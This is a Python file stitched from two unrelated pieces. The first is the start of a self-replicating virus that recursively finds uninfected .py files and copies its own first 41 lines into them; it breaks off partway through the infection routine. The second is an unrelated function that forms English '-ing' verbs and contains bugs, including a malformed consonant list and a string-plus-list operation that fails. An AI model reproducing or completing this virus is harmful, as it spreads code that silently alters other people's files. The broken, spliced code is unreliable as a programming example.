import os, datetime, inspect

DATA_TO_INSERT = "GEEKSFORGEEKS"


# search for target files in path
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:

        # If it is a folder
        if os.path.isdir(path + "/" + filename):
            filestoinfect.extend(search(path + "/" + filename))

            # If it is a python script -> Infect it
        elif filename[-3:] == ".py":

            # default value
            infected = False
            for line in open(path + "/" + filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path + "/" + filename)
    return filestoinfect


# changes to be made in the target file
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i, line in enumerate(virus):
        if i >= 0 and i < 41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
def makeforming(string):
    string = string.lower()
    vowel = ['a','e','i','o','u']
    consonant = ['c for c in letter if c not in vowel']
    exception = ['be','see','flee','knee','lie']

    if string.endswith('e'):
        if string in exception:
            return string + 'ing'
        else:
            string = string [:-1]
            return string + 'ing'

    elif string.endswith(('ie')):
        string = string[:-2]
        return string + 'ying'
    elif string [-1] in consonant and string [-2] in vowel and string [-3] in consonant:
        string += [-1]
        return string + 'ing'

    else:
        return string + 'ing'

word=['lie','see','move','hug']
for item in word:
    print (makeforming(item))
